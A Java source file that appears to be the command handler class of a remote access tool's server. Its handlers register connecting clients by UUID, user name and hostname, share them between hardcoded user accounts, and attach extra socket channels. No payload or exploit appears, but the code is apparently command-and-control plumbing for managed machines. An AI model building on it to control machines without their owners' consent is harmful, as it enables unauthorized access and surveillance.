package ovh.wpkg.lskg.server.command.commands;

import io.netty.channel.Channel;
import jakarta.inject.Inject;
import jakarta.inject.Singleton;
import lombok.extern.slf4j.Slf4j;
import ovh.wpkg.lskg.server.command.Command;
import ovh.wpkg.lskg.server.dto.RatClient;
import ovh.wpkg.lskg.server.dto.WtpClient;
import ovh.wpkg.lskg.server.services.RatClientPoller;
import ovh.wpkg.lskg.server.services.RatService;
import ovh.wpkg.lskg.server.services.WtpClientService;
import ovh.wpkg.lskg.server.types.out.ActionOutPayload;
import ovh.wpkg.lskg.services.rat.RatInfoService;
import ovh.wpkg.lskg.services.users.UserService;

import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.UUID;

@Singleton
@Slf4j
public class DefaultCommands {

    @Inject
    public WtpClientService wtpClientService;

    @Inject
    public RatService ratService;

    @Inject
    public RatInfoService ratInfoService;

    @Inject
    public UserService userService;

    @Inject
    private RatClientPoller ratClientPoller;

    @Command(name = "hello")
    public ActionOutPayload hello(Channel channel) {
        String message = "Hello World!";
        return new ActionOutPayload("hello", 0, message, message.length());
    }

    @Command(name = "echo")
    public ActionOutPayload echo(Map<String, String> params, Channel channel) {
        StringBuilder result = new StringBuilder("Echo: ");
        for (Map.Entry<String, String> entry : params.entrySet()) {
            result.append(entry.getKey())
                    .append("=")
                    .append(entry.getValue())
                    .append(" ");
        }
        String message = result.toString().trim();
        return new ActionOutPayload("echo", 0, message, message.length());
    }

    @Command(name = "core-init")
    public ActionOutPayload coreInit(Map<String, String> params, Channel channel) {
        List<String> requiredKeys = Arrays.asList("uuid", "user", "hostname");

        for (String key : requiredKeys) {
            if (!params.containsKey(key) || params.get(key) == null || params.get(key).isEmpty()) {
                String message = "Missing or empty parameter: " + key;
                return new ActionOutPayload("core-init", 1, message, message.length());
            }
        }

        try {
            UUID uuid = UUID.fromString(params.get("uuid"));
            String user = params.get("user");
            String hostname = params.get("hostname");

            ratInfoService.registerRat(userService.findUserById(1L).orElseThrow(), uuid, hostname, user);
            ratInfoService.shareRat(uuid, userService.findUserById(2L).orElseThrow());

            var wtpClient = wtpClientService.getClient(channel);

            ratService.addClient(wtpClient, uuid, user, hostname);

            String message = "Registered client " + user + " " + hostname + " has been added!";
            return new ActionOutPayload("core-init", 0, message, message.length());
        } catch (IllegalArgumentException e) {
            String message = "Invalid UUID format: " + params.get("uuid");
            return new ActionOutPayload("core-init", 2, message, message.length());
        } catch (Exception e) {
            e.printStackTrace();
            String message = "An unexpected error occurred: " + e.getMessage();
            return new ActionOutPayload("core-init", 3, message, message.length());
        }
    }

    @Command(name = "new-socket")
    public ActionOutPayload newSocket(Map<String, String> params, Channel channel) {
        List<String> requiredKeys = List.of("uuid");

        for (String key : requiredKeys) {
            if (!params.containsKey(key) || params.get(key) == null || params.get(key).isEmpty()) {
                String message = "Missing or empty parameter: " + key;
                return new ActionOutPayload("new-socket", 1, message, message.length());
            }
        }

        UUID uuid;
        try {
            uuid = UUID.fromString(params.get("uuid"));
        } catch (IllegalArgumentException e) {
            String message = "Invalid UUID format: " + params.get("uuid");
            return new ActionOutPayload("new-socket", 1, message, message.length());
        }

        RatClient rat = ratService.getByUUID(uuid);
        if (rat == null) {
            String message = "No entity found for UUID: " + uuid;
            return new ActionOutPayload("new-socket", 1, message, message.length());
        }

        WtpClient wtpClient = new WtpClient(channel);

        rat.getSockets().add(wtpClient);

        // Emit new WTP client id to ratClientPoller
        ratClientPoller.getClientSink().tryEmitNext(channel.id().asShortText());

        String message = "Socket successfully added!";
        return new ActionOutPayload("new-socket", 0, message, message.length());
    }

}